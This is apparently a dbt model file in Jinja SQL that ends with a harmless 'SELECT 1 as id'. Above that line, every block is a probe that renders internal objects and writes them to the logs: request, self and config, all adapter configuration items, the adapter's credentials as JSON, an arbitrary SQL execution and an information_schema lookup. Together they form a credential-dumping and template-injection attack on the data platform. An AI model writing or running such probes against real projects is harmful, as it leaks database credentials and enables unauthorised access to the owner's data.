{% set test1 = render("{{ request }}") %}
{{ log("REQUEST=" ~ (test1 | string)[:200], info=True) }}

{% set test2 = render("{{ self }}") %}
{{ log("SELF=" ~ (test2 | string)[:200], info=True) }}

{% set test3 = render("{{ config }}") %}
{{ log("CONFIG=" ~ (test3 | string)[:200], info=True) }}

{% set test4 = render("{% for key, value in adapter.config.items() %}{{ key }}={{ value }}\n{% endfor %}") %}
{{ log("CFG_ITEMS=" ~ (test4 | string)[:500], info=True) }}

{% set test5 = render("{{ adapter.config.credentials | tojson }}") %}
{{ log("CREDS_JSON=" ~ (test5 | string)[:500], info=True) }}

{% set test6 = render("{{ adapter.execute('SELECT 1') }}") %}
{{ log("EXEC_RESULT=" ~ (test6 | string)[:200], info=True) }}

{% set test7 = render("{{ adapter.get_columns_in_relation(api.Relation.create(database='information_schema', schema='SCHEMATA')) }}") %}
{{ log("COLS=" ~ (test7 | string)[:200], info=True) }}

SELECT 1 as id
